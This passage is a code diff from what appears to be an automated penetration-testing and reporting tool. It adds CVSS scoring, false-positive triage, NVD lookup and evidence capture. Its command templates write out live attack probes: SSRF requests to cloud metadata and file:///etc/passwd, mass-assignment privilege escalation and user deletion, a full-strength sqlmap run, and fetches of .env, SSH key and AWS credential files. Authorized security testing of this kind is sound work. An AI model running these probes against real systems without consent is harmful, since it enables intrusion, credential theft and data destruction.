-                "cmd_template": "echo '---SSRF PROBES---'; for param in url redirect next return callback dest destination link; do code=$(curl -sk -o /dev/null -w '%{http_code}' \"http://{target}/api/v1/fetch?$param=http://169.254.169.254/latest/meta-data/\" 2>/dev/null); echo \"$param=AWS_IMDS: $code\"; code2=$(curl -sk -o /dev/null -w '%{http_code}' \"http://{target}/api/v1/proxy?$param=http://127.0.0.1:22\" 2>/dev/null); echo \"$param=localhost:22: $code2\"; done; echo '---FILE SSRF---'; curl -sk 'http://{target}/api/v1/fetch?url=file:///etc/passwd' -o - 2>&1 | head -5",
+                "cmd_template": "echo '---SSRF PROBES---'; for param in url redirect next return callback dest destination link; do base=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' \"http://{target}/api/v1/fetch?$param=0\" 2>/dev/null); imds=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_ssrf_$$ \"http://{target}/api/v1/fetch?$param=http://169.254.169.254/latest/meta-data/\" 2>/dev/null); ibody=$(tr '\\n' ' ' < /tmp/pwm_ssrf_$$ 2>/dev/null | head -c 120); rm -f /tmp/pwm_ssrf_$$; local=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' \"http://{target}/api/v1/proxy?$param=http://127.0.0.1:22\" 2>/dev/null); echo \"$param=baseline:$base|imds:$imds|$ibody|local22:$local\"; done; echo '---FILE SSRF---'; curl -skL --max-time 8 'http://{target}/api/v1/fetch?url=file:///etc/passwd' -o - 2>&1 | head -5",
                 "parse": "api_ssrf",
             },
             {
                 "id": "api_mass_assign", "label": "Mass Assignment / Overpost", "tool": "curl probes",
                 "description": "Broken Object Property Level Auth — test for mass assignment and privilege escalation via API body.",
-                "cmd_template": "echo '---MASS ASSIGN---'; curl -sk -X PUT -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true,\"admin\":true,\"privilege\":\"admin\"}}' 'http://{target}/api/v1/users/1' -o - 2>&1 | head -8; curl -sk -X PATCH -H 'Content-Type: application/json' -d '{{\"role\":\"superuser\",\"verified\":true,\"credits\":99999}}' 'http://{target}/api/v1/profile' -o - 2>&1 | head -8; echo '---FUNC LEVEL---'; curl -sk -X DELETE 'http://{target}/api/v1/users/1' -o /dev/null -w 'DELETE user: %{http_code}\\n' 2>&1; curl -sk 'http://{target}/api/v1/admin/users' -o /dev/null -w 'admin/users: %{http_code}\\n' 2>&1; curl -sk 'http://{target}/api/v1/internal/debug' -o /dev/null -w 'internal/debug: %{http_code}\\n' 2>&1",
+                "cmd_template": "echo '---MASS ASSIGN---'; curl -sk --max-time 8 -X PUT -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true,\"admin\":true,\"privilege\":\"admin\"}}' 'http://{target}/api/v1/users/1' -o - 2>&1 | head -8; curl -sk --max-time 8 -X PATCH -H 'Content-Type: application/json' -d '{{\"role\":\"superuser\",\"verified\":true,\"credits\":99999}}' 'http://{target}/api/v1/profile' -o - 2>&1 | head -8; echo '---FUNC LEVEL---'; del=$(curl -sk --max-time 8 -X DELETE 'http://{target}/api/v1/users/1' -o /dev/null -w '%{http_code}' 2>/dev/null); echo \"DELETE user:$del|\"; au=$(curl -sk --max-time 8 'http://{target}/api/v1/admin/users' 2>/dev/null | tr '\\n' ' ' | head -c 180); auc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/api/v1/admin/users' 2>/dev/null); echo \"admin/users:$auc|$au\"; idb=$(curl -sk --max-time 8 'http://{target}/api/v1/internal/debug' 2>/dev/null | tr '\\n' ' ' | head -c 180); idc=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/api/v1/internal/debug' 2>/dev/null); echo \"internal/debug:$idc|$idb\"",
                 "parse": "api_mass_assign",
             },
             {
                 "id": "api_misc", "label": "API Misconfiguration & Rate Limit", "tool": "curl probes",
                 "description": "Security misconfigs, missing rate limiting, CORS, verbose errors, third-party API exposure.",
-                "cmd_template": "echo '---CORS---'; curl -sk -H 'Origin: https://evil.com' -I 'http://{target}/api/v1/users' 2>&1 | grep -i 'access-control'; echo '---RATE LIMIT TEST---'; for i in $(seq 1 15); do curl -sk -o /dev/null -w '%{http_code} ' 'http://{target}/api/v1/login' -d 'user=admin&pass=test'; done; echo ''; echo '---VERBOSE ERROR---'; curl -sk 'http://{target}/api/v1/users/INVALID_ID' -o - 2>&1 | head -10; curl -sk -X POST -H 'Content-Type: application/json' -d '{{\"bad\":\"json\"' 'http://{target}/api/v1/users' -o - 2>&1 | head -10; echo '---THIRD PARTY KEYS---'; curl -sk 'http://{target}/api/v1/config' -o - 2>&1 | grep -iE 'api_key|secret|token|password|key|credential' | head -10",
+                "cmd_template": "echo '---CORS---'; curl -skL -H 'Origin: https://evil.com' -I 'http://{target}/api/v1/users' 2>&1 | grep -i 'access-control'; echo '---RATE LIMIT TEST---'; for i in $(seq 1 15); do curl -sk -o /dev/null -w '%{http_code} ' 'http://{target}/api/v1/login' -d 'user=admin&pass=test'; done; echo ''; echo '---VERBOSE ERROR---'; curl -sk 'http://{target}/api/v1/users/INVALID_ID' -o - 2>&1 | head -10; curl -sk -X POST -H 'Content-Type: application/json' -d '{{\"bad\":\"json\"' 'http://{target}/api/v1/users' -o - 2>&1 | head -10; echo '---THIRD PARTY KEYS---'; curl -sk 'http://{target}/api/v1/config' -o - 2>&1 | grep -iE 'api_key|secret|token|password|key|credential' | head -10",
                 "parse": "api_misc",
             },
         ],
@@ -340,7 +422,7 @@ CHAIN = [
             {
                 "id": "ep_sqli_verify", "label": "sqlmap Injection Verification", "tool": "sqlmap",
                 "description": "Verify and enumerate confirmed SQL injection points. Banner, DBMS, current user, databases.",
-                "cmd_template": "sqlmap -u 'http://{target}/?id=1' --batch --level=5 --risk=3 --technique=BEUSTQ --threads=10 --banner --current-user --current-db --hostname --dbs --output-dir={outdir}/sqlmap_verify 2>&1 | tail -60",
+                "cmd_template": "timeout -k 5 1200 sqlmap -u 'http://{target}/?id=1' --batch --level=5 --risk=3 --technique=BEUSTQ --threads=10 --timeout=10 --retries=1 --banner --current-user --current-db --hostname --dbs --output-dir={outdir}/sqlmap_verify 2>&1 | tail -60",
                 "fallback_cmd": "echo '[sqlmap not installed] apt-get install sqlmap'",
                 "parse": "sqlmap",
             },
@@ -385,7 +467,7 @@ CHAIN = [
             {
                 "id": "pe_cred_harvest", "label": "Credential & Secret Harvesting", "tool": "curl / nmap",
                 "description": "Search for exposed credentials, keys, tokens in common paths and service responses.",
-                "cmd_template": "echo '---SECRET PATHS---'; for p in .env .env.local wp-config.php config.php config/database.yml application.properties secrets.yaml backup.sql database.sql id_rsa .git/config .aws/credentials; do code=$(curl -sk -o /dev/null -w '%{http_code}' http://{target}/$p 2>/dev/null); echo $p': '$code; done; echo '---GIT EXPOSURE---'; curl -sk http://{target}/.git/COMMIT_EDITMSG -o - 2>&1 | head -5; curl -sk http://{target}/.git/config -o - 2>&1 | head -10",
+                "cmd_template": "echo '---SECRET PATHS---'; for p in .env .env.local wp-config.php config.php config/database.yml application.properties secrets.yaml backup.sql database.sql id_rsa .git/config .aws/credentials; do out=$(curl -skL --max-time 8 -w '%{http_code}' -o /tmp/pwm_cred_$$ 'http://{target}/'$p 2>/dev/null); body=$(tr '\\n' ' ' < /tmp/pwm_cred_$$ 2>/dev/null | head -c 200); rm -f /tmp/pwm_cred_$$; echo \"$p:$out|$body\"; done; echo '---GIT EXPOSURE---'; curl -skL --max-time 8 http://{target}/.git/COMMIT_EDITMSG -o - 2>&1 | head -5; curl -skL --max-time 8 http://{target}/.git/config -o - 2>&1 | head -10",
                 "parse": "cred_harvest",
             },
             {
@@ -438,15 +520,435 @@ ANOMALY_SIGNATURES = [
     (r"root@", "Root prompt in service banner", "critical"),
     (r"(?i)debug mode|debug=true|DEBUG=1", "Debug mode in production service", "high"),
     (r"(?i)phpinfo\(\)", "phpinfo() exposed", "high"),
-    (r"(?i)\.git/config", "Git repository exposed", "critical"),
-    (r"(?i)\.env", ".env file exposed", "critical"),
-    (r"admin.*200|/admin.*200", "Admin panel accessible (HTTP 200)", "critical"),
-    (r"\.git.*200", "Git directory returning 200", "critical"),
+    (r"(?i)\.git/config\s*[^\n]*\[core\]|(?:^|\n)\s*\[remote\s+\"origin\"\]|repositoryformatversion", "Git repository exposed (config content)", "critical"),
+    (r"(?i)\.env[^\n]*[A-Za-z0-9_]{3,}\s*=\s*\S+", ".env with credential content exposed", "critical"),
     (r"(?i)SSLv2|SSLv3|TLSv1\.0|TLSv1\.1", "Deprecated TLS/SSL protocol enabled", "high"),
     (r"(?i)(cipher|protocol|ssl [cv]|tlsv|ssl3|accepted|preferred)\s*[:=]?[^\n]*\b(RC4|DES|3DES|EXPORT|NULL|anon)\b", "Weak cipher suite enabled", "high"),
-    (r"(?i)heartbleed|VULNERABLE", "Heartbleed confirmed or suspected", "critical"),
+    (r"(?i)heartbleed|CVE-2014-0160|\bVULNERABLE\b", "Heartbleed or script-confirmed VULNERABLE service", "critical"),
     (r"SNMPv2-MIB::sysDescr", "SNMP public community string accepted", "high"),
 ]
+
+
+# Redirect status codes must never constitute a finding by themselves: a
+# 3xx answer means "resource moved", it says nothing about a vulnerability.
+# Findings may only claim a weakness from the FINAL response after following
+# the redirect chain (curl -L), and only where redirect semantics are the
+# verified vulnerability itself (open redirect / host-header reflection) is a
+# 3xx-with-reflected-Location an actual finding.
+REDIRECT_CODES = frozenset({'300', '301', '302', '303', '304', '305', '307', '308'})
+
+
+# Negated-result guard: a line/detail asserting NON-vulnerability ("NOT
+# VULNERABLE", "isn't vulnerable", "does not appear to be vulnerable",
+# "non-vulnerable", "is not exploitable", …) must never become a finding.
+_NEGATED_RESULT = re.compile(
+    r"\bnot\b[^.!?\n;]{0,40}\b(?:vulnerable|exploitable)\b"
+    r"|\b(?:isn't|aren't|wasn't|don't|doesn't|didn't|can't)\b[^.!?\n;]{0,40}\bvulnerable\b"
+    r"|\bnon[-\s]?vulnerable\b"
+    r"|\bnever\s+vulnerable\b",
+    re.I)
+
+
+def sig_matches(output):
+    """Line-based anomaly-signature scan yielding (msg, sev) once per signature.
+
+    Negated script results ("NOT VULNERABLE", "isn't vulnerable",
+    "does not appear to be vulnerable", …) never yield a finding."""
+    seen = set()
+    for line in output.splitlines():
+        if not line.strip() or _NEGATED_RESULT.search(line):
+            continue
+        for sig, msg, sev in ANOMALY_SIGNATURES:
+            if msg in seen:
+                continue
+            if re.search(sig, line, re.I):
+                seen.add(msg)
+                yield msg, sev
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CVSS v3.1 — deterministic calculator + per-finding-class vector profiles
+# ─────────────────────────────────────────────────────────────────────────────
+# Nothing here is guessed: the base score is computed from an explicit vector
+# string via the published CVSS v3.1 formulas. When the resulting severity band
+# differs from the finding's own severity label the mismatch is surfaced
+# (`band_mismatch`) instead of being silently normalised — that is the trigger
+# for analyst review rather than an assumption.
+
+_CVSS_METRIC = {
+    'AV': {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.20},
+    'AC': {'L': 0.77, 'H': 0.44},
+    'PR': {'N': 0.85, 'L': 0.62, 'H': 0.27},          # Scope=Unchanged
+    'PRc': {'N': 0.85, 'L': 0.68, 'H': 0.50},         # Scope=Changed
+    'UI': {'N': 0.85, 'R': 0.62},
+    'CIA': {'H': 0.56, 'L': 0.22, 'N': 0.00},
+}
+
+def _roundup1(x):
+    return _math.ceil((x - 1e-9) * 10) / 10
+
+def cvss31_base_score(vector: str):
+    """Compute the CVSS v3.1 base score for a 'CVSS:3.1/...' vector string.
+
+    Returns None if the vector is malformed. Pure arithmetic — deterministic."""
+    if not vector or not vector.startswith('CVSS:3.1/'):
+        return None
+    m = {}
+    for part in vector.split('/')[1:]:
+        if ':' in part:
+            k, _, v = part.partition(':')
+            m[k] = v
+    if not {'AV', 'AC', 'PR', 'UI', 'S', 'C', 'I', 'A'}.issubset(m):
+        return None
+    try:
+        av, ac, ui = _CVSS_METRIC['AV'][m['AV']], _CVSS_METRIC['AC'][m['AC']], _CVSS_METRIC['UI'][m['UI']]
+        pr = _CVSS_METRIC['PR' if m['S'] == 'U' else 'PRc'][m['PR']]
+        c, i, a = (_CVSS_METRIC['CIA'][m[x]] for x in ('C', 'I', 'A'))
+        ist = 1 - ((1 - c) * (1 - i) * (1 - a))
+        impact = 6.42 * ist if m['S'] == 'U' else (7.52 * (ist - 0.029) - 3.25 * ((ist - 0.02) ** 15))
+        if impact <= 0:          # CVSS v3.1 spec: base score is 0 when impact is nil
+            return 0.0
+        exploitability = 8.22 * av * ac * pr * ui
+        if m['S'] == 'U':
+            score = _roundup1(impact + exploitability)
+        else:
+            score = _roundup1(min(1.08 * (impact + exploitability), 10))
+        return round(min(max(score, 0.0), 10.0), 1)
+    except KeyError:
+        return None
+
+def cvss31_band(score):
+    if score is None: return None
+    if score == 0: return 'none'
+    if score < 4.0: return 'low'
+    if score < 7.0: return 'medium'
+    if score < 9.0: return 'high'
+    return 'critical'
+
+# Curated base vectors per confirmed finding class. Static, reviewable strings;
+# AV:N everywhere (every finding is remotely reachable from the scan host).
+FINDING_CVSS = {
+    "sql_injection":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "blind_sqli":          "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "nosql_injection":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "ssti":                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "default_cred_http":   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "broken_auth":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "broken_function_auth":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "mass_assignment":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "bola_idor":           "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "sensitive_data_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "ssrf":                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "ssrf_lfi":            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "unauth_endpoint":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "env_exposed":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "git_exposed":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "git_config":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "git_config_content":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "api_key_exposure":    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "db_unauth_access":    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "redis_no_auth":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "db_default_cred":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "null_session":        "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "path_traversal":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "host_header_injection":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+    "trace_method":        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "api_cors_wildcard":   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "missing_rate_limit":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+    "verbose_error":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "weak_tls":            "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "weak_cipher":         "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "heartbleed":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "expired_cert":        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "self_signed_cert":    "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "protocol_vuln":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+    "version_eol":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "version_outdated":    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "exploit_available":   "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "open_port":           "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "db_exposed":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cms_wordpress":       "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cms_joomla":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cms_drupal":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "breach_exposure":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "imds_reachable":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "js_secret_leak":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+}
+
+# Fallback vectors when a finding class has no curated profile — also the
+# honest default for anything unclassified (lowest plausible for the label).
+_FINDING_CVSS_FALLBACK = {
+    "critical": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "high":     "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "medium":   "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N",
+    "low":      "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N",
+}
+
+def score_finding(f):
+    """Attach a CVSS v3.1 vector + computed base score to a finding (in place).
+
+    The vector is either the curated profile for the finding class or the
+    severity-fallback vector; both are explicit, reviewable strings. If the
+    computed severity band disagrees with the finding's own label, that
+    disagreement is recorded (`band_mismatch`) rather than hidden."""
+    sev = f.get('severity', 'info')
+    if sev not in ('critical', 'high', 'medium', 'low'):
+        f['cvss'] = {"vector": None, "base_score": 0.0, "severity_band": None, "note": "informational — not scored"}
+        return f
+    vector = FINDING_CVSS.get(f.get('type')) or _FINDING_CVSS_FALLBACK.get(sev)
+    score = cvss31_base_score(vector)
+    band = cvss31_band(score)
+    f['cvss'] = {
+        "vector": vector, "base_score": score,
+        "severity_band": band,
+        "band_mismatch": bool(score is not None and band != sev),
+        "source": "computed-cvss3.1" if score is not None else "error",
+    }
+    return f
+
+# ─────────────────────────────────────────────────────────────────────────────
+# FALSE-POSITIVE TRIAGE — deterministic verdict attached to every finding
+# ─────────────────────────────────────────────────────────────────────────────
+# A vulnerability finding is only 'confirmed' when it rests on concrete artifact
+# or contrast evidence (probe body == the real thing, backend behaviour change);
+# tool-reported lines are 'tool-confirmed'; everything else is 'needs_review'.
+# Status-only recon results are informational. This is the automated triage —
+# an analyst can override any verdict via POST /api/session/<sid>/triage.
+_EVIDENCE_CONFIRMED_TYPES = {
+    "env_exposed", "git_exposed", "git_config", "git_config_content",
+    "api_key_exposure", "cms_wordpress", "cms_joomla", "cms_drupal",
+    "mass_assignment", "broken_function_auth", "bola_idor", "ssrf", "ssrf_lfi",
+    "ssti", "default_cred_http", "broken_auth", "unauth_endpoint",
+    "path_traversal", "host_header_injection", "trace_method",
+    "sensitive_data_exposure", "db_unauth_access", "redis_no_auth",
+    "null_session", "snmp_public", "smb_share", "imds_reachable",
+    "js_secret_leak", "breach_exposure", "s3_public_list", "open_redirect",
+    "sql_injection", "nosql_injection", "blind_sqli", "drupal_login",
+}
+_TOOL_CONFIRMED_TYPES = {
+    "version_eol", "version_outdated", "exploit_available", "weak_tls",
+    "weak_cipher", "heartbleed", "expired_cert", "self_signed_cert",
+    "protocol_vuln", "web_finding", "db_default_cred", "db_exposed",
+    "open_port", "legacy_os", "cve", "signature_match",
+}
+_INFO_TYPES = {
+    "web_path", "api_endpoint", "subdomain", "tech_fingerprint", "email_discovered",
+    "js_endpoint", "sourcemap_exposed", "s3_bucket_probe", "cloud_provider",
+    "evidence_capture", "no_breach",
+}
+
+def _triage_finding(f):
+    sev = f.get('severity', 'info')
+    ftype = f.get('type', '')
+    if ftype in _INFO_TYPES or sev == 'info':
+        verdict, basis = 'info', "informational / status-only recon result — not a vulnerability claim"
+    elif ftype in _EVIDENCE_CONFIRMED_TYPES:
+        verdict, basis = 'confirmed', "probe body or backend contrast matched the artifact directly"
+    elif ftype in _TOOL_CONFIRMED_TYPES:
+        verdict, basis = 'tool-confirmed', "reported by an upstream scanner (nmap/nikto/nuclei/sslscan/searchsploit)"
+    else:
+        verdict, basis = 'needs_review', "single-probe or no artifact content — confirm manually"
+    f['triage'] = {"verdict": verdict, "basis": basis, "provenance": "auto", "note": None, "ts": None}
+    return f
+
+# Session triage log: one record per finding per substage, appended at the
+# single choke point so SSE, /status, PDF and UI stay identical.
+def _append_triage_log(sess, sub_id, findings):
+    log = sess.get('triage_log', {})
+    recs = []
+    for i, f in enumerate(findings):
+        t = f.get('triage', {})
+        recs.append({
+            "index": i, "type": f.get('type'), "severity": f.get('severity'),
+            "verdict": t.get('verdict'), "basis": t.get('basis'),
+            "provenance": t.get('provenance', 'auto'), "note": t.get('note'),
+            "ts": t.get('ts') or datetime.now().isoformat(),
+        })
+    log[sub_id] = recs
+    sess['triage_log'] = log
+
+# ─────────────────────────────────────────────────────────────────────────────
+# NVD VERIFICATION — service version → CVE cross-reference (no guessing)
+# ─────────────────────────────────────────────────────────────────────────────
+# CPEs are only built for products with a known vendor/product mapping. The
+# NVD `cpeName` filter matches CVEs whose affected config references that exact
+# product+version CPE — an NVD-maintained fact, not a keyword guess. Only CVEs
+# carrying a real CVSSv3 vector are reported; lookups are cached and timeout.
+NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
+_NVD_TIMEOUT = 8
+NVD_CACHE = {}
+
+# Curated (service token → (vendor, product-name)) CPE mappings. Products not
+# listed here are reported as "no CPE mapping — manual review" (never assumed).
+CPE_TABLE = {
+    "openssh":      ("openbsd", "openssh"),
+    "apache":       ("apache", "http_server"),
+    "nginx":        ("nginx", "nginx"),
+    "vsftpd":       ("vsftpd", "vsftpd"),
+    "proftpd":      ("proftpd", "proftpd"),
+    "mysql":        ("oracle", "mysql"),
+    "mariadb":      ("mariadb", "mariadb"),
+    "postgres":     ("postgresql", "postgresql"),
+    "postgresql":   ("postgresql", "postgresql"),
+    "mongodb":      ("mongodb", "mongodb"),
+    "redis":        ("redis", "redis"),
+    "elasticsearch":("elastic", "elasticsearch"),
+    "php":          ("php", "php"),
+    "openssl":      ("openssl", "openssl"),
+    "tomcat":       ("apache", "tomcat"),
+    "samba":        ("samba", "samba"),
+    "exim":         ("exim", "exim"),
+    "bind":         ("isc", "bind"),
+    "jenkins":      ("jenkins", "jenkins"),
+    "iis":          ("microsoft", "internet_information_services"),
+    "vsftpd":       ("vsftpd", "vsftpd"),
+    "grafana":      ("grafana", "grafana"),
+    "wordpress":    ("wordpress", "wordpress"),
+    "drupal":       ("drupal", "drupal"),
+    "joomla":       ("joomla", "joomla"),
+}
+
+def _nvd_verify_cpe(product_cpe, version):
+    """Return NVD-verified CVEs for (cpe vendor:product, version) or [].
+    [] means genuinely no NVD CPE match (honest negative)."""
+    key = (product_cpe, version)
+    if key in NVD_CACHE:
+        return NVD_CACHE[key]
+    results = []
+    candidates = list(dict.fromkeys([version] + ([_strip_ver_suffix(version)] if _strip_ver_suffix(version) else [])))
+    for cand in candidates:
+        if not cand:
+            continue
+        cpe = f"cpe:2.3:a:{product_cpe}:{cand}:*:*:*:*:*:*:*"
+        try:
+            req = urllib.request.Request(
+                f"{NVD_API}?cpeName={urllib.parse.quote(cpe)}",
+                headers={'User-Agent': 'pwm-cve-verify'})
+            with urllib.request.urlopen(req, timeout=_NVD_TIMEOUT) as r:
+                data = json.load(r)
+        except Exception:
+            continue
+        vulns = data.get('vulnerabilities', [])
+        for v in vulns:
+            c = v.get('cve', {})
+            cid = c.get('id', '')
+            met = (c.get('metrics') or {}).get('cvssMetricV31') or (c.get('metrics') or {}).get('cvssMetricV30') or []
+            if not met:
+                continue
+            cv = (met[0].get('cvssData') or {})
+            if not cv.get('vectorString') or cv.get('baseScore') is None:
+                continue
+            results.append({
+                "cve": cid, "score": cv['baseScore'], "vector": cv['vectorString'],
+                "published": (c.get('published') or '')[:10],
+                "reference": ((c.get('references') or [{}])[0].get('url')) or '',
+            })
+        if results:
+            break
+    dedup = list({(x['cve'], x['score'], x['vector']): x for x in results}.values())
+    dedup.sort(key=lambda x: x['score'], reverse=True)
+    NVD_CACHE[key] = dedup[:8]
+    return NVD_CACHE[key]
+
+def _strip_ver_suffix(version):
+    m = re.match(r'(\d+(?:\.\d+){1,2})', version or '')
+    return m.group(1) if m and m.group(1) != version else None
+
+# ─────────────────────────────────────────────────────────────────────────────
+# EVIDENCE CAPTURE — screenshot + PCAP per confirmed finding (pre-exploitation)
+# ─────────────────────────────────────────────────────────────────────────────
+_CHROME_BINS = ['google-chrome', 'chromium', 'chromium-browser']
+
+def _finding_url(f, sess):
+    """Best-effort URL for evidence capture. Returns None when we only have a
+    host, so no fabricated evidence is produced."""
+    target = sess.get('target', '')
+    p = str(f.get('path') or '')
+    cmd = str(f.get('command') or '')
+    if p.startswith('/'):
+        return f"http://{target}{p}"
+    m = re.search(r'https?://\S+', cmd)
+    if m:
+        return m.group(0).rstrip('.').replace('"', '')
+    return None
+
+def _capture_evidence(f, sess):
+    """Screenshot + PCAP for one finding; writes into <outdir>/evidence.
+    Returns info dict; never fabricates — if the capture tool errors, the
+    record states the error instead of claiming a file exists."""
+    evdir = os.path.join(sess['outdir'], 'evidence')
+    os.makedirs(evdir, exist_ok=True, mode=0o700)
+    idx = len(os.listdir(evdir))
+    stamp = datetime.now().strftime('%H%M%S')
+    url = _finding_url(f, sess)
+    rec = {"finding_type": f.get('type'), "path": f.get('path'), "url": url,
+           "screenshots": [], "pcap": None, "errors": []}
+    if not url:
+        rec["errors"].append("no http(s) endpoint in finding — screenshot skipped")
+        return rec
+
+    # Screenshot via headless chrome.
+    for binname in _CHROME_BINS:
+        path = shutil.which(binname)
+        if not path:
+            continue
+        shot = os.path.join(evdir, f"{idx:02d}_{stamp}_{f.get('type','x')}.png")
+        ok = True
+        try:
+            subprocess.run(
+                [path, '--headless=new', '--no-sandbox', '--disable-gpu',
+                 '--hide-scrollbars', '--window-size=1280,800',
+                 '--virtual-time-budget=4000', f'--screenshot={shot}', url],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                timeout=25)
+            if os.path.exists(shot) and os.path.getsize(shot) > 800:
+                with open(shot, 'rb') as fh:
+                    magic = fh.read(8)
+                if magic.startswith(b'\x89PNG'):
+                    rec["screenshots"].append(shot)
+            else:
+                ok = False
+        except Exception:
+            ok = False
+        if rec["screenshots"]:
+            break
+        if not ok:
+            rec["errors"].append(f"{binname} screenshot produced no valid PNG")
+    if not rec["screenshots"] and os.path.exists(shot):
+        try: os.remove(shot)
+        except OSError: pass
+
+    # PCAP: tcpdump during a short re-probe of the same URL.
+    if shutil.which('tcpdump'):
+        pcap = os.path.join(evdir, f"{idx:02d}_{stamp}_{f.get('type','x')}.pcap")
+        try:
+            host = sess['target']
+            if ':' in host: host = host.split(':')[0]
+            proc = subprocess.Popen(
+                f"tcpdump -i any -s 0 -c 100 -w '{pcap}' host '{host}' 2>/dev/null",
+                shell=True)
+            try:
+                subprocess.run(['curl', '-skL', '--max-time', '5', '-o', '/dev/null', url],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
+            except Exception:
+                pass
+            try:
+                proc.wait(timeout=10)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+            if os.path.exists(pcap) and os.path.getsize(pcap) > 24:
+                with open(pcap, 'rb') as fh:
+                    magic = fh.read(4)
+                if magic in (b'\xd4\xc3\xb2\xa1', b'\xa1\xb2\xc3\xd4', b'\x4d\x3c\xb2\xa1', b'\xa1\xb2\x3c\x4d'):
+                    rec["pcap"] = pcap
+                else:
+                    rec["errors"].append("pcap magic mismatch — file discarded")
+            else:
+                rec["errors"].append("tcpdump produced no capture")
+        except Exception as e:
+            rec["errors"].append(f"pcap capture failed: {e}")
+    else:
+        rec["errors"].append("tcpdump not installed — pcap skipped")
+    return rec
 
 # ─────────────────────────────────────────────────────────────────────────────
 # HELPERS
@@ -736,6 +1238,8 @@ def parse_nikto(output):
 def parse_ssl(output):
     findings = []
     for line in output.splitlines():
